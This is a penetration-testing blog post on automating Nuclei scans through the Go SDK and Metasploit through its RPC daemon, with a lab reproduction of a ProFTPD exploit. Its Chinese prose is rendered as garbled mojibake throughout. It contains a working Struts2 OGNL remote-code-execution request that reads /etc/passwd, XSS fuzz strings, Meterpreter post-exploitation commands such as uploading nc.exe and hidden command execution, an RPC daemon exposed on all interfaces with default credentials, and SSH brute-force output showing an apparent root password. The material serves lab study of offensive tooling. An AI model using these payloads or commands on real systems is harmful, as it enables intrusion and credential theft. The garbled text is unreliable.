---
date: 2026-01-19 17:57:46
title: Nucleiã€Metasploité…åˆä½¿ç”¨
permalink: /pages/f40590
categories:
  - PenTest
---

## 01.Nuclei
å®˜æ–¹æä¾›GO SDK, å¯ä»¥ç›´æ¥ä½¿ç”¨GOè¯­è¨€è¿›è¡ŒäºŒæ¬¡å¼€å‘   
ä»£ç ç¤ºä¾‹ï¼Œå…¶ä¸­éœ€è¦æ³¨æ„çš„SDKå†…éƒ¨çš„å®ç°ï¼Œä¼ å‚çš„æ–¹å¼æœ‰2ç§:
- é€šè¿‡WithOptions(opts),ä¸€æ¬¡æ€§æŠŠæ‰€æœ‰å‚æ•°éƒ½ä¼ è¿‡å»ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„é€šè¿‡WithOptionsä¸åšå­—æ®µåˆå¹¶ï¼Œä¸åšå…œåº•æ ¡éªŒï¼Œä¸å…³å¿ƒé¡ºåºå‰¯ä½œç”¨ï¼Œéœ€è¦æŠŠæ‰€æœ‰å¿…è¦çš„å‚æ•°éƒ½ä¼ è¿‡å»ï¼Œåæ¥çš„ option å¯ä»¥è¦†ç›–å‰é¢çš„ä»»ä½•ä¸œè¥¿
- é€šè¿‡WithXXXï¼Œä¸¤è€…ä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œä¼šè¦†ç›–ï¼Œè¿™ç§æ–¹å¼åªä¼šè¦†ç›–æŒ‡å®šçš„å­—æ®µï¼Œä¸ä¼šå…¨éƒ¨è¦†ç›–
```go
// Package nucleiSDK
// @author: liuyanfeng
// @date: 2026/1/21 15:14
// @description:
package main

import (
	"fmt"
	nuclei "github.com/projectdiscovery/nuclei/v3/lib"
	"github.com/projectdiscovery/nuclei/v3/pkg/output"
	"github.com/projectdiscovery/nuclei/v3/pkg/types"
	"sync"
)

type CustomResultHandler struct {
	results []*output.ResultEvent
	mu      sync.Mutex
}

func (h *CustomResultHandler) Handle(event *output.ResultEvent) {
	h.mu.Lock()
	defer h.mu.Unlock()

	h.storeResult(event)
}

func (h *CustomResultHandler) storeResult(event *output.ResultEvent) {
	// store result to database
	if event.MatcherStatus {
		fmt.Printf("ğŸ“Š å‘½ä¸­è§„åˆ™:\n")
		fmt.Printf("TemplateID: %+v\n", event.TemplateID)
		fmt.Printf("TemplatePath: %+v\n", event.TemplatePath)
		fmt.Printf("Type: %+v\n", event.Type)
		fmt.Printf("Matched: %+v\n", event.Matched)
		fmt.Printf("================================")
	}
}

func main() {
	opts := types.DefaultOptions()
	opts.ExecutionId = "1234567890"
	opts.Templates = []string{"D:\\DevTools\\nuclei-templates-10.3.5\\nuclei-templates-10.3.5\\http"}
	//opts.NoInteractsh = true
	// create nuclei engine with options
	ne, err := nuclei.NewNucleiEngine(
		nuclei.WithOptions(opts),
		//nuclei.WithInteractshOptions(nuclei.InteractshOpts{
		//	NoInteractsh: true,
		//}),
		//nuclei.WithTemplatesOrWorkflows(nuclei.TemplateSources{
		//	Templates: []string{"D:\\DevTools\\nuclei-templates-10.3.5\\nuclei-templates-10.3.5\\http"},
		//}),
	)
	if err != nil {
		fmt.Println(err)
	}

	// with custom result handler
	handler := &CustomResultHandler{}
	// load targets and optionally probe non http/https targets
	ne.LoadTargets([]string{"123.58.224.8:62385"}, true)
	err = ne.ExecuteWithCallback(handler.Handle)
	if err != nil {
		fmt.Println(err)
	}
	defer ne.Close()

}

```
### æ‰«æCVE-2021-31805ç¤ºä¾‹
ä»¥CVE-2021-31805ä¸ºä¾‹ï¼Œä»¥ä¸‹å…·ä½“çš„æ¼æ´yamlï¼Œæºå¸¦ç›¸å…³å­—æ®µè§£é‡Š
```yaml
# æ¼æ´å”¯ä¸€æ ‡è¯†ï¼Œé€šå¸¸ä¸ CVE ä¿æŒä¸€è‡´
id: CVE-2021-31805
info:
  # æ¼æ´åç§°ï¼Œæ‰«æç»“æœä¸­å±•ç¤ºç»™ç”¨æˆ·
  name: Apache Struts2 S2-062 - Remote Code Execution
  # æ¨¡æ¿ä½œè€…
  author: taielab
  # æ¼æ´ä¸¥é‡ç­‰çº§ï¼ˆinfo / low / medium / high / criticalï¼‰
  severity: critical
  # æ¼æ´èƒŒæ™¯è¯´æ˜
  description: |
    Apache Struts2 S2-062 is vulnerable to remote code execution.
    The fix issued for CVE-2020-17530 (S2-061) was incomplete,
    meaning some of the tag's attributes could still perform a double
    evaluation if a developer applied forced OGNL evaluation by using
    the %{...} syntax.
  # æ¼æ´é€ æˆçš„ç›´æ¥å½±å“
  impact: |
    Remote code execution
  # å®˜æ–¹ä¿®å¤å»ºè®®
  remediation: |
    Avoid using forced OGNL evaluation on untrusted user input,
    and/or upgrade to Struts 2.5.30 or greater which checks if
    expression evaluation won't lead to the double evaluation.
  # å‚è€ƒé“¾æ¥ï¼Œä¾¿äºæº¯æºä¸å¤ç°
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-062
    - https://github.com/Axx8/Struts2_S2-062_CVE-2021-31805
    - https://nvd.nist.gov/vuln/detail/CVE-2021-31805
    - http://www.openwall.com/lists/oss-security/2022/04/12/6
    - https://security.netapp.com/advisory/ntap-20220420-0001/
  classification:
    # CVSS 3.1 å‘é‡
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    # CVSS åˆ†æ•°
    cvss-score: 9.8
    # CVE ç¼–å·
    cve-id: CVE-2021-31805
    # å¯¹åº”çš„ CWEï¼ˆè¡¨è¾¾å¼æ³¨å…¥ï¼‰
    cwe-id: CWE-917
    # EPSSï¼šæ¼æ´è¢«åˆ©ç”¨çš„æ¦‚ç‡è¯„åˆ†
    epss-score: 0.93956
    epss-percentile: 0.99872
    # å—å½±å“äº§å“çš„ CPE æè¿°
    cpe: cpe:2.3:a:apache:struts:*:*:*:*:*:*:*:*
  metadata:
    # æœ¬æ¨¡æ¿æœ€å¤šå‘èµ·çš„ HTTP è¯·æ±‚æ¬¡æ•°
    max-request: 1
    # å‚å•†
    vendor: apache
    # äº§å“
    product: struts
    # Shodan æœç´¢æŒ‡çº¹ï¼Œç”¨äºèµ„äº§å‘ç°
    shodan-query:
      - http.html:"apache struts"
      - http.title:"struts2 showcase"
      - http.html:"struts problem report"
    # FOFA æœç´¢æŒ‡çº¹
    fofa-query:
      - body="struts problem report"
      - title="struts2 showcase"
      - body="apache struts"
    # Google æœç´¢æŒ‡çº¹
    google-query: intitle:"struts2 showcase"
  # æ ‡ç­¾ï¼Œç”¨äºåˆ†ç±»ã€è¿‡æ»¤æ¨¡æ¿
  tags: cve2021,cve,apache,rce,struts,struts2,intrusive,vkev,vuln
http:
  - raw:
      - |
        # ä½¿ç”¨ POST è¯·æ±‚è§¦å‘è¡¨å•è§£æ
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
        Content-Length: 1095
        # multipart è¡¨å•èµ·å§‹è¾¹ç•Œ
        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
        Content-Disposition: form-data; name="id"
        # åˆ©ç”¨ç‚¹ï¼šå¼ºåˆ¶ OGNL è¡¨è¾¾å¼ %{...}ï¼Œè§¦å‘åŒé‡è§£æ
        %{
        (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
        (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
        (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
        (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
        (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
        (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
        (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
        (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
        # æœ€ç»ˆé€šè¿‡ freemarker Execute æ‰§è¡Œç³»ç»Ÿå‘½ä»¤
        (#application.get('org.apache.tomcat.InstanceManager')
          .newInstance('freemarker.template.utility.Execute')
          .exec({'cat /etc/passwd'}))
        }
        # multipart è¡¨å•ç»“æŸè¾¹ç•Œ
        ------WebKitFormBoundaryl7d1B1aGsV2wcZwFâ€”
    matchers:
      - type: regex
        # ä» HTTP å“åº”ä½“ä¸­åŒ¹é…å‘½ä»¤æ‰§è¡Œç»“æœ
        part: body
        regex:
          - "root:.*:0:0:"
```
### æœ‰æ•ˆç»“æœè¾“å‡º
ä¾æ®ä¸Šè¿°ä»£ç ï¼Œå¯å®ç°Nucleiæ‰«æç»“æœçš„è‡ªå®šä¹‰å¤„ç†ï¼Œå°†åŒ¹é…ç»“æœè¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œæˆ–ç»„è£…è‡ªå®šä¹‰çš„æ•°æ®ç»“æ„ï¼Œè¿›è¡Œåç»­çš„å¤„ç†  

```text
ğŸ“Š å‘½ä¸­è§„åˆ™:
TemplateID: CVE-2021-31805
TemplatePath: D:\DevTools\nuclei-templates-10.3.5\nuclei-templates-10.3.5\http\cves\2021\CVE-2021-31805.yaml
Type: http
Matched: http://123.58.224.8:57546

================================
ğŸ“Š å‘½ä¸­è§„åˆ™:
TemplateID: cookies-without-secure
TemplatePath: D:\DevTools\nuclei-templates-10.3.5\nuclei-templates-10.3.5\http\misconfiguration\cookies-without-secure.yaml
Type: javascript
Matched: 123.58.224.8:57546
================================
ğŸ“Š å‘½ä¸­è§„åˆ™:
TemplateID: cookies-without-httponly
TemplatePath: D:\DevTools\nuclei-templates-10.3.5\nuclei-templates-10.3.5\http\misconfiguration\cookies-without-httponly.yaml
Type: javascript
Matched: 123.58.224.8:57546
================================
ğŸ“Š å‘½ä¸­è§„åˆ™:
TemplateID: xss-fuzz
TemplatePath: D:\DevTools\nuclei-templates-10.3.5\nuclei-templates-10.3.5\http\vulnerabilities\generic\xss-fuzz.yaml
Type: http
Matched: http://123.58.224.8:57546/?image=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-image%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-id%27%29%3E&order=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-order%27%29%3E&sid=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-sid%27%29%3E&language=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-language%27%29%3E&filter=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-filter%27%29%3E&import=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-import%27%29%3E&st=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-st%27%29%3E&act=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-act%27%29%3E&object=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-object%27%29%3E&insert=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-insert%27%29%3E&task=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-task%27%29%3E&dismiss=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-dismiss%27%29%3E&orderby=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-orderby%27%29%3E
================================

```

### æ³¨æ„
- `ExecutionId` ä½œç”¨
  - ä¸€æ¬¡ `Nuclei` æ‰«ææ‰§è¡Œçš„å…¨å±€å”¯ä¸€èº«ä»½æ ‡è¯†
- `nuclei`åˆå§‹åŒ–é¡ºåº
  - `NewNucleiEngineCtx`æ‰§è¡Œå¼€å§‹ä¼šåˆ›å»ºä¸€ä¸ªé»˜è®¤çš„`types.DefaultOptions()`å’Œ`ExecutionId`
  - æ¥ä¸‹æ¥é€šè¿‡`for _, option := range options`è¯»å–ä¼ å…¥çš„é…ç½®`ï¼ˆWithOptionsã€Withxxxï¼‰`
  - é—®é¢˜å‡ºç°åœ¨`WithOption`ä¸­ï¼Œå†…éƒ¨ä¼šæ‰§è¡Œ`e.opts = opts`ï¼Œç›´æ¥å…¨éƒ¨è¦†ç›–æ‰ä¹‹å‰é»˜è®¤ç”Ÿæˆçš„ï¼Œè€Œæ¬¡æ˜¯å¦‚æœä½ ä¼ å…¥çš„`opts`æ²¡æœ‰`ExecutionId`ï¼Œé‚£ä¹ˆæœ€ç»ˆçš„`e.opts.ExecutionId`å°±æ˜¯ç©ºçš„

## 02.Metasploit

### æ¼æ´é¶åœºå¹³å°éƒ¨ç½²
å‚è€ƒï¼š
- https://blog.csdn.net/qxx5203/article/details/147230714
- https://vulhub.org/zh

### CVE-2015-3306æ¼æ´å¤ç°
ç®€ä»‹: ProFTPDæ˜¯ProFTPDå›¢é˜Ÿçš„ä¸€å¥—å¼€æºçš„FTPæœåŠ¡å™¨è½¯ä»¶ã€‚è¯¥è½¯ä»¶å…·æœ‰å¯é…ç½®æ€§å¼ºã€å®‰å…¨ã€ç¨³å®šç­‰ç‰¹ç‚¹ã€‚ ProFTPD 1.3.5ä¸­çš„mod_copyæ¨¡å—å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡ç«™ç‚¹cpfrå’Œsite cptoå‘½ä»¤è¯»å–å’Œå†™å…¥ä»»æ„æ–‡ä»¶ã€‚ä»»ä½•æœªç»èº«ä»½éªŒè¯çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥åˆ©ç”¨è¿™äº›å‘½ä»¤å°†æ–‡ä»¶ä»æ–‡ä»¶ç³»ç»Ÿçš„ä»»ä½•éƒ¨åˆ†å¤åˆ¶åˆ°é€‰å®šçš„ç›®æ ‡ã€‚ å¤åˆ¶å‘½ä»¤ä½¿ç”¨ProFTPDæœåŠ¡çš„æƒé™æ‰§è¡Œï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æœåŠ¡åœ¨â€œnobodyâ€ç”¨æˆ·çš„æƒé™ä¸‹è¿è¡Œã€‚ é€šè¿‡ä½¿ç”¨/ proc / self / cmdlineå°†PHPæœ‰æ•ˆè´Ÿè½½å¤åˆ¶åˆ°ç½‘ç«™ç›®å½•ï¼Œå¯ä»¥å®ç°PHPè¿œç¨‹ä»£ç æ‰§è¡Œã€‚
1. vulfocuså¯åŠ¨ç¯å¢ƒ
![alt text](assets/04.CVE-2015-3306å¤ç°/image-2.png)
2. å¯åŠ¨msfconsole,æœç´¢ç›¸å…³æ¼æ´
![alt text](assets/04.CVE-2015-3306å¤ç°/image-1.png)
3. ä½¿ç”¨è¯¥exploit, è®¾ç½®ç›¸å…³å‚æ•°
![alt text](assets/04.CVE-2015-3306å¤ç°/image.png)
4. æ‰§è¡Œexploit, æˆåŠŸåå¼¹shell, 
![alt text](assets/04.CVE-2015-3306å¤ç°/image-3.png)
flagåœ¨/tmpä¸­,é€šè¿‡envä¹Ÿå¯ä»¥æŸ¥çœ‹
![alt text](assets/04.CVE-2015-3306å¤ç°/image-4.png)
5. ä¸‹ä¸€æ­¥å¯ä»¥å°è¯•ææƒåˆ°root
ä¸Šä¼ åˆ°ææƒæ£€æŸ¥è„šæœ¬linuxprivchecker.pyåˆ°ç›®æ ‡ä¸‹ `upload "xx\linuxprivchecker.py" /tmp/linuxprivchecker.py`  
![alt text](assets/04.CVE-2015-3306å¤ç°/image-5.png)  
æ‰§è¡Œ`execute -f python /tmp/linuxprivchecker.py`
å¯é€šè¿‡`shell` æ£€æŸ¥å‘½ä»¤æƒé™  
```shell
shell
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[-] python3 not found
[*] Trying to find binary 'script' on the target machine
[*] Found script at /usr/bin/script
[*] Using `script` to pop up an interactive shell
```
ä»ä¸Šè¿°æ¼æ´å¤ç°çš„æ­¥éª¤æ¥çœ‹ï¼Œå¤§ä½“çš„ä¸€ä¸ªæ¸—é€æµç¨‹å¦‚ä¸‹ï¼š
1. è¿›å…¥msfconsole
2. æœç´¢ç›¸å…³æ¼æ´
3. è®¾ç½®ç›¸å…³å‚æ•°
4. æ‰§è¡Œexploit, æˆåŠŸåå¼¹shell
5. ä¸‹ä¸€æ­¥å¯ä»¥å°è¯•ææƒåˆ°root

### Meterpreterå¸¸ç”¨å‘½ä»¤
åœ¨è·å–åˆ°shellåï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œäº¤äº’æ“ä½œï¼Œä¸åŒçš„æ“ä½œç¯å¢ƒï¼Œå¯ä½¿ç”¨çš„å‘½ä»¤ä¼šæœ‰æ‰€ä¸åŒ
#### åŸºæœ¬å‘½ä»¤  
```bash
background
# ä¿å­˜ä¼šè¯ï¼Œè¿”å›msfconsole
session
# æŸ¥çœ‹æ‰€æœ‰ä¼šè¯ï¼Œè¿›å…¥ä¼šè¯ï¼šsession -i <session id>
quit
# å…³é—­å½“å‰ä¼šè¯
shell
# ä¼šè¯ä¸‹ä½¿ç”¨ï¼Œè·å–shell
```
#### æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤  
```bash
cat
# æŸ¥çœ‹æ–‡ä»¶å†…å®¹
getwd
# æŸ¥çœ‹å½“å‰åœ¨ç›®æ ‡çš„å·¥ä½œç›®å½•
upload nc.exe c:\
# ä¸Šä¼ æ–‡ä»¶ï¼Œ-rä¸Šä¼ ç›®å½•
download c:\\nc.exe
# ä¸‹è½½æ–‡ä»¶ï¼ŒåŒæ–œæ éœ€è½¬ç§»
edit c:\\windows\\system32\\drivers\\etc\\hosts
# å¯¹æ–‡ä»¶è¿›è¡Œç¼–è¾‘
search -d c:\\ -f *.mdb
# æœç´¢æ–‡ä»¶
```

#### ç½‘ç»œå‘½ä»¤  
```bash
ipconfig
portwd add -l 1234 -p 3389 -r 192.168.1.131
# ç«¯å£è½¬å‘ï¼Œä¾‹ï¼šç›®æ ‡ç«¯å£åªå…è®¸å†…ç½‘è®¿é—®3389ï¼Œé‚£ä¹ˆå¯ç”¨æ­¤æ¡å‘½ä»¤å°†å…¶3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼Œå®ç°æœ¬åœ°è®¿ç›®æ ‡3389ç«¯å£
# -læœ¬åœ°ç«¯å£å‘æ”¾ï¼Œ-rç›®æ ‡ip
route
# è·¯ç”±ä¿¡æ¯
```

#### ç³»ç»Ÿå‘½ä»¤  
```bash
ps
# æŸ¥çœ‹è¿›ç¨‹
migrate <pid>
# å°†meterpreterä¼šè¯è½¬ç§»åˆ°å…¶å®ƒç¨³å®šè¿›ç¨‹ï¼Œå¦‚explorer.exe
execute -H -i -f cmd.exe
# åœ¨ç›®æ ‡ä¸Šéšè—æ‰§è¡Œcmd
getpid
# è·å–å½“å‰meterpreteræ³¨å…¥è¿›ç¨‹çš„pid
kill <pid>
# ç»“æŸæŒ‡å®šè¿›ç¨‹
get uid
# è·å¾—ç”¨æˆ·åï¼Œä»è€ŒæŸ¥çœ‹æƒé™
sysinfo
# ç³»ç»Ÿä¿¡æ¯
shutdown
# å…³æœº
```
### RPCæœåŠ¡

ç›®å‰ Metasploit çš„ RPC æœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼š 
- HTTP å’Œ Messagepack 
- HTTP å’Œ JSON  
äºŒè€…åŒºåˆ«ï¼š  

| ç»´åº¦ | JSON-RPC | Messagepack-RPC |  
| ---- | ---- | ---- |
| å¯åŠ¨æ–¹å¼ | Rack Web Serverï¼ˆThin/Puma ç­‰ï¼‰       | `msfrpcd` |
| æ•°æ®æ ¼å¼ | JSON | Messagepack |
| ç‰¹æ€§ | æ–‡æœ¬æ ¼å¼ã€æ›´å®¹æ˜“è°ƒè¯• | äºŒè¿›åˆ¶ã€æ›´é«˜æ•ˆã€æ›´é€‚åˆç¨‹åºè°ƒç”¨ |
| æ€§èƒ½ | ç›¸å¯¹è¾ƒæ…¢ | è¾ƒå¿« |
| è°ƒç”¨å‡½æ•° | HTTP POST JSONâ€“RPC 2.0     |  rpc.call(â€¦)       |


| ç»´åº¦   | msfconsole + msfrpc | msfrpcd   |
| ---- | ------------------- | --------- |
| è¿›ç¨‹æ¨¡å‹ | ä¾é™„ console          | ç‹¬ç«‹ daemon |
| æ˜¯å¦äº¤äº’ | æ˜¯                   | å¦         |
| ç”Ÿå‘½å‘¨æœŸ | æ‰‹åŠ¨                  | æœåŠ¡çº§       |
| è‡ªåŠ¨åŒ–  | âŒ                   | âœ…         |
| ç¨³å®šæ€§  | ä¸€èˆ¬                  | é«˜         |
| å¹³å°é›†æˆ | âŒ                   | âœ…         |
| å®˜æ–¹å®šä½ | è°ƒè¯•                  | æ­£å¼ RPC    |

æŒ‰ç…§å®˜ç½‘æ–‡æ¡£è¯´æ˜ï¼Œmsfrpcd æ˜¯å®˜æ–¹æ¨èçš„ RPC æœåŠ¡ï¼Œå®ƒæ˜¯ç‹¬ç«‹çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå¯ä»¥é€šè¿‡ `msfrpcd -h` æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ã€‚   
```shell
# å¯ç”¨æ–¹å¼
msfrpcd -a 0.0.0.0 -p 55553 -U msf -P msf -S -f
# çœ‹åˆ°å¦‚ä¸‹è¾“å‡ºï¼Œåˆ™è¡¨ç¤ºå¯åŠ¨æˆåŠŸ
[*] MSGRPC starting on 0.0.0.0:55553 (NO SSL):Msg...
[*] MSGRPC ready at 2026-01-27 17:15:46 +0800.
# åŒæ—¶ä¹Ÿå¯ç¡®è®¤è¿›ç¨‹ç«¯å£æ˜¯å¦å ç”¨æ¥ç¡®è®¤å¯åŠ¨å®Œæˆ
netstat -ano | findstr 55553
```

::: info æç¤º
ä¸‹é¢è¿™æ®µä»£ç æˆªå–è‡ª 
[dr0op/msfrpcapi](https://github.com/dr0op/msfrpcapi){target="_blank" rel="noreferrer"}
:::

```python
# ä¸€ä¸ªç®€å•çš„pythonè¿æ¥ç¤ºä¾‹

# _*_ encoding:utf-8 _*_
# __author__ = "dr0op"
# python3

import msgpack
import http.client

HOST="127.0.0.1"
PORT="55553"
headers = {"Content-type" : "binary/message-pack"}

# è¿æ¥MSF RPC Socket
req = http.client.HTTPConnection(HOST, PORT)
options = ["auth.login","msf","msf"]
# å¯¹å‚æ•°è¿›è¡Œåºåˆ—åŒ–ï¼ˆç¼–ç ï¼‰
options = msgpack.packb(options)
# å‘é€è¯·æ±‚ï¼Œåºåˆ—åŒ–ä¹‹åçš„æ•°æ®åŒ…
req.request("POST","/api/1.0",body=options,headers=headers)
# è·å–è¿”å›
res = req.getresponse().read()
# å¯¹è¿”å›è¿›è¡Œååºåˆ—æˆ·ï¼ˆè§£ç ï¼‰
res = msgpack.unpackb(res)
res = res[b'token'].decode()
print(res)
# å°†è¾“å‡º{'result': 'success', 'token': 'TEMPSsU2eYsNDom7GMj42ZldrAtQ1vGK'}
```
#### RPC API æ–‡æ¡£
[rpc standard api å®˜æ–¹æ–‡æ¡£](https://docs.rapid7.com/metasploit/standard-api-methods-reference/)  

å¦‚æœæƒ³åŸºäºä»£ç å®ç°ä¸€ä¸ªå®Œæ•´çš„æ¸—é€æµç¨‹ï¼Œå…¶åŸºæœ¬æµç¨‹åº”è¯¥å¦‚ä¸‹ï¼š
1. ç™»å½•`msfrpcd`, è·å–`token`, å­˜å‚¨`token`,ç”¨äºåç»­æ“ä½œ
2. åˆ›å»ºä¸€ä¸ª`console`ç»ˆç«¯, ç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œ`console`è‡ªå·±æœ‰`write`å’Œ`read`çš„æ–¹æ³•å®ç°
3. æ•´ç†å‘½ä»¤ï¼Œå‘é€å‘½ä»¤åˆ°`console.write`,ä¾‹å¦‚ä¸€ä¸ªå®Œæ•´çš„å‘½ä»¤åº”å¦‚ä¸‹
```shell
  cmd = """
    use auxiliary/scanner/ssh/ssh_login # ä½¿ç”¨sshç™»å½•æ¨¡å—
    set RHOSTS 127.0.0.1                # è®¾ç½®ç›®æ ‡ip
    set USERNAME root                   # è®¾ç½®ç”¨æˆ·å
    set PASS_FILE /tmp/pass.txt         # è®¾ç½®å¯†ç æ–‡ä»¶
    exploit                             # æ‰§è¡Œæ¨¡å—
  """
```
4. è½®è¯¢ç»“æœ`console.read`, è·å–ç»“æœ
5. é”€æ¯ç»ˆç«¯`console.destroy`

### æœ‰æ•ˆç»“æœè¾“å‡º
MSF æ²¡æœ‰åƒ Nuclei é‚£æ ·å¤©ç„¶æ ‡å‡†åŒ–çš„æœ‰æ•ˆè¾“å‡ºåˆ¤å®šï¼Œæ¯”å¦‚å‘½ä¸­äº†å“ªä¸ªæ¨¡æ¿ï¼Œå…·ä½“çš„å‘½ä¸­è§„åˆ™

MSF çš„æœ‰æ•ˆè¾“å‡ºï¼Œéœ€è¦ç»“åˆæ¨¡å—çš„è¾“å‡ºå†…å®¹æ¥åˆ¤æ–­ï¼Œæ¯”å¦‚å¦‚ä¸‹æ˜¯å¯¹ä¸»æœºè¿›è¡Œssh_loginæµ‹è¯•
```shell
# æœªç™»å½•æˆåŠŸ
[*] 127.0.0.1:22          - Starting bruteforce
[*] 127.0.0.1:22 SSH - Testing User/Pass combinations
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```shell
# ç™»å½•æˆåŠŸ
[*] 10.253.14.5:22        - Starting bruteforce
[*] 10.253.14.5:22 SSH - Testing User/Pass combinations
[+] 10.253.14.5:22        - Success: 'root:antiy?pmc' 'uid=0(root) gid=0(root) groups=0(root) Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (10.253.109.4:53765 -> 10.253.14.5:22) at 2026-02-02 15:02:42 +0800
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
é€šè¿‡ä»£ç å®Œæ•´çš„æ‰§è¡Œå¦‚ä¸‹å›¾ï¼š  
![alt text](assets/03.Nucleiã€Metasploité…åˆä½¿ç”¨/image.png)
å¯¹äºmsfçš„ç»“æœåˆ¤æ–­ä»éœ€è¿›ä¸€æ­¥çš„è€ƒè™‘